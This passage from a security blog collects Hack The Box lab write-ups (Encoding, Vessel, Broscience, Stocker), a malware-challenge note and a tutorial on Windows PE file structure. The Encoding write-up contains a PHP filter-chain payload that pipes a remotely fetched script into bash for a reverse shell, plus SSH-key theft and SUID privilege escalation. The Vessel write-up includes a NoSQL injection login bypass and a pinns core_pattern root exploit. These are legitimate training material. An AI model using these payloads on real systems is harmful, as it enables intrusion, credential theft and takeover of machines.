generator.\n$ python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?= `curl http://myIp/rev_bash_norm.sh|bash` ;?\u0026gt;\u0026#39; And I hosted a web server containing the rev_bash_norm.sh, I won\u0026rsquo;t show the full monstrosity of the generated filter request but in the end it looked like this:\nPOST /v3/tools/string/index.php HTTP/1.1 Host: api.haxtables.htb Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/json Content-Length: 12920 { \u0026#34;action\u0026#34;: \u0026#34;b64encode\u0026#34;, \u0026#34;file_url\u0026#34; : \u0026#34;email@image.haxtables.htb/actions/action_handler.php?page=php://filter/\u0026lt;bruhmoment\u0026gt;\u0026#34; } Whenever executed, this request will spawn a reverse shell.\nThe www-data to svc(user) was honestly too much for me, and I turned to some write-ups.\nThe next section is what I\u0026rsquo;ve tried and failed, feel free to skip it.\n\u0026lt;i-tried-this\u0026gt; I was pretty sure that it has something to do with the git scripts and I only had rwxr-xr-x permissions of the .git folder, so I\u0026rsquo;ve tried to simulate file edit by using the dumped repository and change all the files in the .git directory on the server.\nAnd that was kinda the right approach, but I didn\u0026rsquo;t notice the ssh keys that I needed to retrieve, so I was hard stuck at this, and I went to some write-ups.\n\u0026lt;/i-tried-this\u0026gt;\nCheck gatogamer1155\u0026rsquo;s write-up for gaining access to the user and retrieve the first flag.\nTLDR:\nCreates an executable file /tmp/readkey with a content that reads the ~/.ssh/id_rsa file and saves it to file. Creates a git attributes file with a new filter called indent: '*.php filter=indent' Sets the Git configuration filter.indent.clean to the command /tmp/readkey. This tells Git to apply the indent filter to files ending in .php and to use the /tmp/readkey command to process the filter. Execute the /var/www/image/scripts/git-commit.sh with sudo -u svc The filter is then applied, and you can read the private key file. NOTE: Make sure that whenever you save the private key on your machine add an empty line at the end of the file otherwise you will get an error!\nAfter logging with the svc user, you can read the first flag.\nFlag 2 Honestly, this was too easy, but I didn\u0026rsquo;t mind it since I spent too much time doing this box.\nExecuting the sudo -l would give you the executables that you can execute as root.\n(root) NOPASSWD: /usr/bin/systemctl restart * I had to create a service that looks like that and place it under /etc/systemd/system/syl.service\n[Service] Type=simple ExecStart=chmod +s /bin/bash [Install] WantedBy=multi-user.target And simply execute:\n$ sudo /usr/bin/systemctl restart syl $ bash -p bash-5.1# cat root/root.txt . . . ","permalink":"https://sy1.sh/writeups/htb-encoding/","summary":"This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.\nYou will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE\nFlag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on.","title":"Hack The Box - Encoding [Medium]"},{"content":"Overview Since it becomes very time consuming doing this in a video this write-up is going to be in a text.\nThe machine is labeled hard with a good reason, most of the tasks are time consuming but there are some interesting vulnerabilities like CVE-2022-0811 and CVE-2022-24637.\nOn top of these we have NoSQL Injection and some PE reverse engineering.\nWrite-up Flag 1 First I began enumerating the whole website with ffuf.\n$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u \u0026#34;http://vessel.htb/FUZZ\u0026#34; -fs 26 With that I discovered a folder called dev which then led me to dumping the git repository of the website:\n$ git-dumper http://vessel.htb/dev/.git ./website_dump With the website avaliable, I can check the actual source code for vulnerabilities, immediately after opening the routes/index.js I have noticed that this code might be vulnerable to NoSQL Injection.\n... let username = req.body.username; let password = req.body.password; if (username \u0026amp;\u0026amp; password) { connection.query(\u0026#39;SELECT * FROM accounts WHERE username = ? AND password = ?\u0026#39;, [username, password], function(error, results, fields) { ... The code doesn\u0026rsquo;t check if the passed values if they are objects, I can use a crafted NoSQL payload to successfully login with the admin user using this payload while doing the POST request:\nusername=admin\u0026amp;password[password]=1 Upon another discovery in the admin panel, I found that there is another domain on the host called openwebanalytics. From further investigation over what can be exploted there I have landed on CVE-2022-24637. With that exploit I could run a successful reverse shell on the machine.\nUsing linpeas I found some useful information over the user steven\n/home/steven/passwordGenerator # Windows PE Exectuable /home/steven/.notes/screenshot.png # Screenshot of some program /home/steven/.notes/notes.pdf # Password protected PDF I suspected that the screenshot.png is am image of the passwordGenerator.On the other hand the passwordGenerator was unusually big and the whole use of that binary is to create \u0026lsquo;secure\u0026rsquo; passwords. I noticed the python icon on the binary and I suspected that this could be a packed python project with PyInstaller. I confirmed that when I loaded the whole thing in Ghidra/IDA.\nI have used pyinstxtractor to extract the *.pyc files, and then the uncomplyle6 to decompile the *.pyc files. Which has led me to the actual source code of the binary:\nThis is the function that generates the password:\ndef genPassword(self): length = value char = index if char == 0: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^\u0026amp;*()_-+={}[]|:;\u0026lt;\u0026gt;,.?\u0026#39; else: if char == 1: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#39; else: if char == 2: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890\u0026#39; else: try: qsrand(QTime.currentTime().msec()) password = \u0026#39;\u0026#39; for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle(\u0026#39;Error\u0026#39;) msg.setText(\u0026#39;Error while generating password!, Send a message to the Author!\u0026#39;) x = msg.exec_() return password I edited the length to 32 (as I have it on the screenshot) and edited the script a bit more to create a list out of possible passwords. I can do that because the QTime.currentTime().msec() function returns the numbers from 1-1000 with that range I have a big chance of guessing the generated password.\nNote: This process can be a bit frustrating since it takes time to generate the passwords. I personally spent little over an hour.\nThen I used pdfcrack to crack the password of the PDF, there I found the password for the user ethan and I successfully logged in with it and I found the first flag.\nFlag 2 I ran linpeas.sh again, and I found the following SUID binary:\n... ╔══════════╣ Readable files belonging to root and readable by me but not world readable -rwsr-x--- 1 root ethan 814936 Mar 15 2022 /usr/bin/pinns ... I searched around a bit what is this, and I landed on the CVE-2022-0811 which exploited this binary. While doing this, I noticed that I also have the runc.\n╔══════════╣ Container related tools present /usr/sbin/runc This was a very tricky one, and it needs some understanding of what\u0026rsquo;s going on to successfully execute the attack. You can check out the link I\u0026rsquo;ve provided for CVE-2022-0811 to understand more about it. On the actual POC they have used Kubernetes, on our end I had to use runc.\nThe parameters that are being passed to pinns are not being sanitized and validated, so I can use that to execute code with root access.\nI needed to create a container using the runc without using root so I\u0026rsquo;ve used the --rootless arg.\nReference: https://github.com/opencontainers/runc/#rootless-containers\n$ mkdir /tmp/syl $ cd /tmp/syl/ $ runc spec --rootless $ mkdir rootfs $ echo \u0026#34;chmod +s /usr/bin/bash\u0026#34; \u0026gt; syl.sh Then I should mount the root to the root of the container:\nReference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation\n$ runc --root /tmp/syl/ run alpine # cat /etc/machine-id c4ca4238a0b923820dcc509a6f75849b This will run the container and spawn a shell. Next I would ssh into the machine from another session to execute the pinns binary to our container.\n$ /usr/bin/pinns -d /var/run -f c4ca4238a0b923820dcc509a6f75849b -s \u0026#39;kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/syl/syl.sh #\u0026#39; --ipc --net --uts --cgroup Then I need to trigger a core dump so that the pinns would execute the script in a case of a core dump. Following the PoC in crowdstrike:\n# ulimit -c unlimited # ulimit -c unlimited # tail -f /dev/null \u0026amp; # ps .. Find the `tail -f /dev/null` PID # kill -SIGSEGV {thePID} [1]+ Segmentation fault (core dumped) tail -f /dev/null Back to the other session\n$ bash -p $ cat /root/root.txt {HASH} ","permalink":"https://sy1.sh/writeups/htb-vessel/","summary":"Overview Since it becomes very time consuming doing this in a video this write-up is going to be in a text.\nThe machine is labeled hard with a good reason, most of the tasks are time consuming but there are some interesting vulnerabilities like CVE-2022-0811 and CVE-2022-24637.\nOn top of these we have NoSQL Injection and some PE reverse engineering.\nWrite-up Flag 1 First I began enumerating the whole website with ffuf.","title":"Hack The Box - Vessel [Hard]"},{"content":"\rShort Overview The video consist of my process of enumeration and overall hacking the machine, please use this as a walkthrough.\nThis box consist of several vulnerabilities:\nLocal File Inclusion/Path traversal - The query string path= in the img.php file is vulnerable to that, with that we can download the site map that I\u0026rsquo;ve discovered using Burp Deserialization / PHP Object Injection - I saw that in the utils.php file, and I\u0026rsquo;ve prepared a payload for the AvatarInterface since this is the class that is using magic methods, and it has the file_get_contents function that we are going to use to pull the PHP reverse shell. Linux Privilege Escalation - By pure luck, I noticed the renew_cert.sh in the /opt/ folder, and I immediately noted that this must be the vector that needs to be leveraged to gain privilege escalation. A much better way to figure out this can be the pspy tool, which could have shown me this command that is being run as root: timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt and I did look up for some hints, thanks to gatogamer1155and his writeup for this machine. ","permalink":"https://sy1.sh/writeups/htb-broscience/","summary":"Short Overview The video consist of my process of enumeration and overall hacking the machine, please use this as a walkthrough.\nThis box consist of several vulnerabilities:\nLocal File Inclusion/Path traversal - The query string path= in the img.php file is vulnerable to that, with that we can download the site map that I\u0026rsquo;ve discovered using Burp Deserialization / PHP Object Injection - I saw that in the utils.php file, and I\u0026rsquo;ve prepared a payload for the AvatarInterface since this is the class that is using magic methods, and it has the file_get_contents function that we are going to use to pull the PHP reverse shell.","title":"Hack The Box - Broscience [Medium]"},{"content":"\rShort Overview This box consist of several vulnerabilities:\nNoSQL Injection - Specifically the part with sending the payload using JSON, we use this vulnerability to bypass the login process. Server Side Template Injection - We could directly use HTML and then inject an iframe which src is set to /etc/passwd and after that we traverse the application itself to find the MongoDB user/password, and we used those to connect successfully to the machine using the password provided there. With that, we owned the User. Linux Privilege Escalation - Then we use sudo -l to check what commands are we allowed to execute with root privileges. And we exploited the node executable, which runs with root privileges, to own the System. ","permalink":"https://sy1.sh/writeups/htb-stocker/","summary":"Short Overview This box consist of several vulnerabilities:\nNoSQL Injection - Specifically the part with sending the payload using JSON, we use this vulnerability to bypass the login process. Server Side Template Injection - We could directly use HTML and then inject an iframe which src is set to /etc/passwd and after that we traverse the application itself to find the MongoDB user/password, and we used those to connect successfully to the machine using the password provided there.","title":"Hack The Box - Stocker [Easy]"},{"content":"Overview Putting up my analysis of some malware samples.\nSamples Report 5dee718c386934d2494ee5ddde79d27a69c1687493b6eb40d0db47f730ab76fb View 6fd9909f8ec811577351402832665d4a6b6e5399422b8cac79dd98532ac48913 View 19a3dd8024bb4677261ecd8bb85e8a4c53d15870e4b9d2203e933a00b7eecb85 View 280d2ceb081745412127a018055234f5a72935a77aa102aef7924ba21f43d4ee View f8c4c946eaedcfa8bbb722970211c2c4a458f6483dafb5d5a7fd83b3daa441cd View f8c4c946eaedcfa8bbb722970211c2c4a458f6483dafb5d5a7fd83b3daa441cd I eventually found the XOR cipher key, unfortunately my bruteforce script wasn\u0026rsquo;t able to recover the url but in the end the string wasn\u0026rsquo;t exactly an url. The key was en-CB and the decoded string is c2.2go.ma1w.are_eT!/eab/+CE%\u0026amp;6d\n","permalink":"https://sy1.sh/writeups/malware-analysis-2022cb-challenges/","summary":"Overview Putting up my analysis of some malware samples.\nSamples Report 5dee718c386934d2494ee5ddde79d27a69c1687493b6eb40d0db47f730ab76fb View 6fd9909f8ec811577351402832665d4a6b6e5399422b8cac79dd98532ac48913 View 19a3dd8024bb4677261ecd8bb85e8a4c53d15870e4b9d2203e933a00b7eecb85 View 280d2ceb081745412127a018055234f5a72935a77aa102aef7924ba21f43d4ee View f8c4c946eaedcfa8bbb722970211c2c4a458f6483dafb5d5a7fd83b3daa441cd View f8c4c946eaedcfa8bbb722970211c2c4a458f6483dafb5d5a7fd83b3daa441cd I eventually found the XOR cipher key, unfortunately my bruteforce script wasn\u0026rsquo;t able to recover the url but in the end the string wasn\u0026rsquo;t exactly an url. The key was en-CB and the decoded string is c2.2go.ma1w.are_eT!/eab/+CE%\u0026amp;6d","title":"Malware Analysis - CB Challenges"},{"content":"Overview Recently, I decided do delve a little bit more into static analysis, something beyond just running strings on a binary and getting the ASCII characters that are printable. I decided to take a deep look at how FLOSS is working and possibly recreate some of its functionality in my own tool.\nBefore reading further, I want you to know that this post is about research I did on static analysis. There is nothing new here - no new tools or features are being discovered. Everything that I talk about already exists in other tools. A big part of this research uses the OpenAI Chat GPT. I made sure to fact-check the information provided here, as the GPT can sometimes produce misleading output.\nMy research focuses on Windows Portable Executable (PE) files because they are the most common type. Therefore, we\u0026rsquo;ll start by exploring how these files operate.\nKeywords RVA (Relative Virtual Address) - the virtual address of an object from the file once it is loaded into memory, minus the base address of the file image. IDT (Import Directory Table) - is a data structure in a Portable Executable (PE) file that stores information about dynamic-link libraries (DLLs) that the file depends on and the functions that the file imports from those DLLs. ILT - is a data structure in a Portable Executable (PE) file that stores the addresses of imported functions in the executable or library. IAT (Import Address Table) - can be the same with ILT, however when a file is being loaded into memory the loader will overwrite the addresses of the IAT with their new memory address locations. DEP (Data Execution Prevention) - is a security feature that is designed to prevent code from being executed in certain areas of memory where it is not supposed to be executed. doc ASLR (Address Space Layout Randomization) - is a security feature that randomizes the memory locations of certain parts of a program or operating system, making it more difficult for attackers to predict or control where certain code or data is located in memory. wiki Windows Portable Executable (PE) An executable is a set of binary data that contains instructions for the operating system to execute when the program is loaded into memory. Let\u0026rsquo;s examine how we can manually parse a Portable Executable (PE) file by reading and interpreting the bytes it contains. To do this, we must carefully review the binary data in the PE file and try to make sense of it.\nThe term image refers to the contents of a file when it is loaded into memory. You will encounter this term frequently in the explanations below.\nDOS Header The first 64 bytes of a binary file represent the DOS header, which is included for backwards compatibility and does not directly affect the functioning of the Portable Executable (PE). These 64 bytes contain information such as the number of pages in the file, the number of relocations, the checksum, OEM identifiers, and reserved words. The last 4 bytes of the DOS header, e_lfanew, contain the offset or address of the new PE header in modern Windows applications.\nThe first two bytes of an executable file, 4D 5A which translates to MZ in ASCII, serve as an indicator that the file is an executable intended for use on a Windows operating system.\nWhy 4D 5A? DOS Stub / Rich Header Following the first 64 bytes is the DOS Stub, a small program that displays an error message on systems that are not compatible with MS-DOS. This is a legacy feature dating back to the early days of Windows, when the operating system was built on top of MS-DOS.\nThe Rich Header, on the other hand, is not a required or standard part of the Portable Executable (PE) file format. It contains metadata about the compiler or packer that was used to create the executable and may provide additional information about the file. The magic number for the Rich Header is 52 69 63 68, which translates to Rich in ASCII.\nThe Rich Header information is encrypted using the XOR cipher, which can be easily decrypted using the 4 bytes immediately following the Rich ASCII which is the key.\nTo decrypt the rest of the header, we must run the XOR decipher on the file and unmask the value 44 61 6E 53, which translates to \u0026ldquo;DanS\u0026rdquo; in ASCII. This marks the beginning of the Rich Header, which is then followed by 3 0s after deciphering.\nWith this information, we can determine the start and end of the Rich Header and parse it accordingly.\nThe header can contain data about:\nCompiler and build environment information Timestamps Checksums Other metadata The Rich Header is a very interesting topic that I would like to write more about, until then you can read the following articles.\nVB2019 paper: Rich Headers: leveraging this mysterious artifact of the PE format The devil’s in the Rich header NT Headers (New Technology) If we follow the offset indicated in the last two bytes of the DOS header, we will reach the new PE headers (also known as NT headers). These headers are identified by the 4-byte magic number 50 45 00 00, which translates to PE.. in ASCII. This magic number is used to distinguish the PE headers from other types of headers.\nThe structure of the _IMAGE_NT_HEADERS64:\ntypedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; The structure of _IMAGE_FILE_HEADER:\ntypedef struct _IMAGE_FILE_HEADER { WORD Machine; // Predefined value [IMAGE_FILE_MACHINE_I386 or IMAGE_FILE_MACHINE_AMD64] WORD NumberOfSections; DWORD TimeDateStamp; // Timestamp of which the executable was compiled or linked DWORD PointerToSymbolTable; // The offset to the COFF Symbol Table DWORD NumberOfSymbols; // The number of symbols in the COFF Header WORD SizeOfOptionalHeader; WORD Characteristics; // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; What is COFF? The structure of _IMAGE_OPTIONAL_HEADER, this structure is \u0026ldquo;optional\u0026rdquo; but in fact most of the PE files contains this header.\ntypedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; // .text section size DWORD SizeOfInitializedData; // .data section size DWORD SizeOfUninitializedData; // .bss section size DWORD AddressOfEntryPoint; // 0 if a DLL because its optional otherwise it indicates the RVA (Relative Virtual Address) it is used to determine the address of elements within the file (strings, icons etc.) DWORD BaseOfCode; // The RVA is the base address of the code section loaded in memory DWORD BaseOfData; // The RVA for the base address of the data section DWORD ImageBase; // This indicates the prefered address at which the file is intended to be loaded in memory, almost never used address instead the PE Loader looks for unused memory space to load the image. DWORD SectionAlignment; // Sections are aligned in memory boundaries that are multiples of this value DWORD FileAlignment; // Raw data alignment on disk WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; // Reserved (for future use) must be 0, ensures that the file is compatible with the current system DWORD SizeOfImage; // It gets rounded to a multiple of `SectionAlignment` DWORD SizeOfHeaders; // Sum(DOS Stub, NT Headers, Section Headers) DWORD CheckSum; // Checksum of the Image WORD Subsystem; // Refer to documentation for this one WORD DllCharacteristics; // Refer to documentation for this one DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; // Obsolete refering to documentation, 0 DWORD NumberOfRvaAndSizes; // Size of DataDirectory below IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // This contains the addresses of the Export/Import Directories, the Base Relocation table and so on. It is a constant of `16`. } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; I\u0026rsquo;ve written some quick comments on each of the fields however since that struct is lengthy and well documented you can check the fields here as well.\nHere is the the list of Data Directories entries:\n#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor Sections Headers The section headers are stored in the NT Headers. And the structure of the IMAGE_SECTION_HEADER looks like this:\ntypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Source and Documentation PE Format The sections of a Portable Executable (PE) file contain various types of data, such as code, data, resources, and other information. The headers of the file are used to specify the characteristics of these sections, such as whether they contain executable code, initialized data, uninitialized data, or other types of information.\nTip: You can detect if a PE file has been packed by comparing the values of the VirtualSize and SizeOfRawData fields in the headers. If the VirtualSize is significantly larger than the SizeOfRawData, it is a strong indication that the file has been packed. However, it is worth noting that there may be some discrepancy between the two values due to section padding and alignment.\nSections Sections are where the actual data of the file is. There are Special Sections as well but we will focus only on the reserved sections such as:\n.bss - Uninitialized data (free format) .data - Initialized data (free format) .cormeta - CLR metadata that indicates that the object file contains managed code .debug (following with) $F - Generated FPO Frame Poiner Omission debug information (obsolete) $P - Precompiled debug types (object only) $S - Debug symbols (object only) $T - Debug types (object only) .drective - Linker Options .edata/.idata - Export/Import Tables .idlsym - Includes registered SEH (image only) to support IDL attributes. Often used in conjuction with FPO ref .pdata - Exception information .rdata - Read-only initialized data .reloc - Relocations of the Image .rsrc - Resource Directory .s(following with) - Global Pointer-relative .sbss - uninitialized data .sdata - initialized data .srdata - read-only data .sxdata - Registered exception handler data (free format and x86/object only) .vsdata - initialized data (free format and for ARM, SH4, and Thumb architectures only) .text - Executable code (free format) .tls/.tls$ - Thread-local storage (object only) .xdata - Exception information (free format) Refer to the documentation for further explanation. Each section is explained very well there.\nImport Directory Table (IDT) The Import Directory Table (IDT) stores information about dynamic-link libraries (DLLs) that a Portable Executable (PE) file depends on and the functions that the file imports from those DLLs. In most cases, this information is stored in the .idata section of the PE file, which is dedicated to this purpose. However, in some cases, the IDT may be stored elsewhere.\nThe address of the IDT can be found in the IMAGE_DATA_DIRECTORY array of the _IMAGE_OPTIONAL_HEADER structure. It is the second entry in the array. Each entry in the IDT is 8 bytes in size, with the first 4 bytes representing the address of the entry and the second 4 bytes representing the size. This information is used by the operating system\u0026rsquo;s dynamic linker to resolve the addresses of the imported functions and link them to the actual functions in the imported DLLs.\nLet\u0026rsquo;s take a look at an example:\nCC280000 The IDT is located at 0xCC28 A0000000 The size is 160 (A0) Following the address of the Import Directory we reach the first import located at 0xCC28, let\u0026rsquo;s see what is located at that address.\nEach Import is defined by 24 bytes, given these 24 bytes values:\nF8290000 OriginalFirstThunk 00000000 Timestamp 00000000 Forwarder Chain (Address) C02A0000 Name of the Import (RVA) D8210000 FirstThunk OriginalFirstThunk/FirstThunk To find out which functions are imported by a particular import in a Portable Executable (PE) file, we can follow the OriginalFirstThunk address at 0xF829, which leads us to the Import Lookup Table (ILT). The ILT is a sequence of bytes that represents the addresses of the imported functions, similar to an array or table.\nNote: It\u0026rsquo;s important to note that the Import Address Table (IAT) may be the same as the ILT. However, when a file is loaded, the loader will overwrite the addresses in the IAT with the new memory addresses of the imported functions.\nEach function address in the ILT is 8 bytes in length, so the resulting data should look something like this:\nFC2A0000 This is the address of the imported function 00000000 at 0xFC2A -\u0026gt; B001 Ordinal/Name Import Flag 5368656C6C4578656375746557 ASCII -\u0026gt; \u0026#39;ShellExecuteW\u0026#39; 00 Null char terminating the string With this we can denote and \u0026lsquo;parse\u0026rsquo; all the imports and respectively their imported functions.\nResources To locate the resources in a Portable Executable (PE) file, you can use the third entry in the IMAGE_DATA_DIRECTORY array of the IMAGE_OPTIONAL_HEADER structure. This entry contains the address and size of the resources section in the file.\n00000000 Characteristics 00000000 TimeDateStamp 0000 Major Version 0000 Minor Version 0000 Number of Named entities 0400 Number of ID entities And the corresponding struct\ntypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; WORD NumberOfNamedEntries; WORD NumberOfIdEntries; IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } Now let\u0026rsquo;s take a look at the entries IMAGE_RESOURCE_DIRECTORY_ENTRY\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY { union { struct { DWORD NameOffset:31; DWORD NameIsString:1; } DUMMYSTRUCTNAME; DWORD Name; WORD Id; } DUMMYUNIONNAME; union { DWORD OffsetToData; // Leads us to the resource directory struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; } DUMMYSTRUCTNAME2; } DUMMYUNIONNAME2; } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; The user mmn3mm has written a pretty good explanation of how to parse this section here.\nException Directory The Exception Directory is a section in a Portable Executable (PE) file that contains information about the exception handling functions in the code. It includes the addresses of the exception handling functions, the types of exceptions they handle, and other relevant details.\nWhen an exception occurs, the operating system\u0026rsquo;s exception handling mechanism uses the Exception Directory to find the appropriate exception handling function. This section is optional and may not be present in every PE file, depending on whether the code in the file uses exception handling.\nIt is typically located at .pdata section, and the offset to the Exception section is the 4th entry in the IMAGE_DATA_DIRECTORY array.\nPersonal Note: As far as I understood that section (I could be wrong here) it contains exception handlers that are being used throughout the execution and they execute only if the execution is within the specified BeginAddress and EndAddress.\nThe entries there are 12 bytes, first 4 bytes contains the BeginAddress the next 4 bytes contain the EndAddress and the last 4 bytes contains the address (UnwindInfoAddress) for the Unwind Information Block which contains information of how to unwind the stack whenever an exception occurs.\nBase Relocations When a program is compiled, the compiler saves a value into the IMAGE_OPTIONAL_HEADER.ImageBase field, which specifies the desired memory location where the program is intended to be executed. However, this memory location is often already occupied by other programs, so the actual memory location used by the program may be different. In this case, the loader will recalculate the ImageBase value and write the new value into the program\u0026rsquo;s image. This will cause all addresses in the program that are offset by the ImageBase value (essentially, all addresses in the program) to be recalculated with the new ImageBase value and stored in the .reloc section of the image. This process is necessary to ensure that the program can run correctly at its actual memory location.\nThe user 0xRick has written a very good article of how to calcuate the entries within the Relocation Block and more.\nDebug Microsoft Documentation\nThe Debug section is the 7th entry of the IMAGE_DATA_DIRECTORY array, its structure looks like this:\ntypedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // Describing the debug info DWORD TimeDateStamp; WORD MajorVersion; // Version of the debugging tool WORD MinorVersion; // Version of the debugging tool DWORD Type; // Type of Debugging (this will denote the format that you need to parse) DWORD SizeOfData; // The size of the debug data (not including the debug directory itself) DWORD AddressOfRawData; // The address of the debug data when loaded, relative to the image base DWORD PointerToRawData; // The file pointer to the debug data. } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; Refer to the Microsoft\u0026rsquo;s Documentation about how to parse further debug information.\nLoad Config This section contains information about the dynamic linking and loading of the executable or library and it is the 11th entry of the IMAGE_DATA_DIRECTORY array. The Load Config section typically includes information such as the address of the entry point of the program, the size of the stack and heap, and the addresses of any imported functions or data.\nIt can also include security and integrity-related information, such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) settings.\nIt is typically located at .rdata section and it is an optional section for a PE file.\nThe structure follows:\ntypedef struct _IMAGE_LOAD_CONFIG_DIRECTORY { DWORD Size; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD GlobalFlagsClear; DWORD GlobalFlagsSet; DWORD CriticalSectionDefaultTimeout; DWORD DeCommitFreeBlockThreshold; DWORD DeCommitTotalFreeThreshold; PVOID LockPrefixTable; DWORD MaximumAllocationSize; DWORD VirtualMemoryThreshold; DWORD ProcessAffinityMask; DWORD ProcessHeapFlags; WORD CSDVersion; WORD DependentLoadFlags; PVOID EditList; PVOID SecurityCookie; PVOID SEHandlerTable; DWORD SEHandlerCount; PVOID GuardCFCheckFunctionPointer; PVOID GuardCFDispatchFunctionPointer; PVOID GuardCFFunctionTable; DWORD GuardCFFunctionCount; DWORD GuardFlags; } IMAGE_LOAD_CONFIG_DIRECTORY, *PIMAGE_LOAD_CONFIG_DIRECTORY; Access Rights of the Sections The section rights are presented in the DWORD Characteristics; field of the _IMAGE_SECTION_HEADER , you can check the valid values in the microsoft\u0026rsquo;s documentation.\nThose are the standard access rights of PE.\nSection Name Access Rights .text Read and Execute .rdata Read-Only .data Read and Write .bss Read and Write .rsrc Read Only .reloc Read Only Note: Seungwon Lee has indicated that if an essential element of an executable is the WRITE property of a section, the PE could be packed.\nConclusion This is the first part of my research on static analysis; the primary focus would be on Windows PEs and exactly how much information I can extract before going into the guessing territory.\nIn order for me to do that, I must know how do these files look like and what raw information is stored in their contents; that is why I started this research by examining Windows\u0026rsquo;s PE files.\nI hope you have reached that far and the information that I have provided is useful for you!\nReferences https://chat.openai.com/ https://github.com/mandiant/flare-floss https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings https://stackoverflow.com/questions/36550038/in-utf-16-utf-16be-utf-16le-is-the-endian-of-utf-16-the-computers-endianness https://0xrick.github.io/ https://securelist.com/the-devils-in-the-rich-header/84348/ https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/ https://forensicitguy.github.io/rich-header-hashes-with-pefile/ https://github.com/mmn3mm/peresources The Study of Evasion of Packed PE from Static Detection (Mirza Baig, Pavol Zavarsky, Ron Ruhl, Dale Lindskog) Han, Seungwon Lee, Keungi Lee, Sangjin, “Packed PE File Detection for Malware Forensics”, Computer Science and its Applications, 2nd International Conference, http://ieeexplore.ieee.org/stamp/stamp.jsp?arn umber=05404211, 12 Dec 2009 ","permalink":"https://sy1.sh/posts/static-analysis-research-p1/","summary":"Overview Recently, I decided do delve a little bit more into static analysis, something beyond just running strings on a binary and getting the ASCII characters that are printable. I decided to take a deep look at how FLOSS is working and possibly recreate some of its functionality in my own tool.\nBefore 